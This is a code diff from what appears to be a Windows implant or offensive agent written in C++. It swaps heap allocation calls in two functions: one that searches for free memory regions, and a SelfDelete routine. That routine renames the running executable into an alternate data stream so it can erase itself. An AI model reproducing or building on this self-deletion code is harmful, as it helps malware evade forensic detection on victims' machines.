@@ -3,7 +3,7 @@
 using namespace Root;
 
 auto Useful::ValidGranMem( ULONG GranCount ) -> PVOID {
-    MEMORY_BASIC_INFORMATION* MemInfo = (MEMORY_BASIC_INFORMATION*)Self->Hp->Alloc( sizeof( MEMORY_BASIC_INFORMATION ) );
+    MEMORY_BASIC_INFORMATION* MemInfo = (MEMORY_BASIC_INFORMATION*)hAlloc( sizeof( MEMORY_BASIC_INFORMATION ) );
 
     PVOID PrefBases[] = {
         (PVOID)0x00000000DDDD0000,
@@ -30,13 +30,13 @@ auto Useful::ValidGranMem( ULONG GranCount ) -> PVOID {
                 if ( MEM_FREE != MemInfo->State ) break;
             }
             if ( i == GranCount ) {
-                Self->Hp->Free( MemInfo );
+                hFree( MemInfo );
                 return Base;
             }
         }
     }
 
-    Self->Hp->Free( MemInfo );
+    hFree( MemInfo );
     return nullptr;
 }
 
@@ -319,7 +319,7 @@ auto DECLFN Useful::SelfDelete( VOID ) -> BOOL {
     const auto NewStream  = L":redxvz";
     const auto StreamSize = Str::LengthW( NewStream ) * sizeof(WCHAR);
     const auto RenameSize = sizeof(FILE_RENAME_INFO) + StreamSize;
-    const auto RenamePtr  = (PFILE_RENAME_INFO)Self->Hp->Alloc( RenameSize ); 
+    const auto RenamePtr  = (PFILE_RENAME_INFO)hAlloc( RenameSize ); 
     if ( !RenamePtr ) { return FALSE; }
 
     RenamePtr->FileNameLength = StreamSize;
@@ -343,7 +343,7 @@ auto DECLFN Useful::SelfDelete( VOID ) -> BOOL {
     KhDbg("[+] Self file deletion succefully\n");
 
     Self->Ntdll.NtClose(FileHandle);
-    if ( RenamePtr ) Self->Hp->Free( RenamePtr );
+    if ( RenamePtr ) hFree( RenamePtr );
 
     return TRUE;
 }
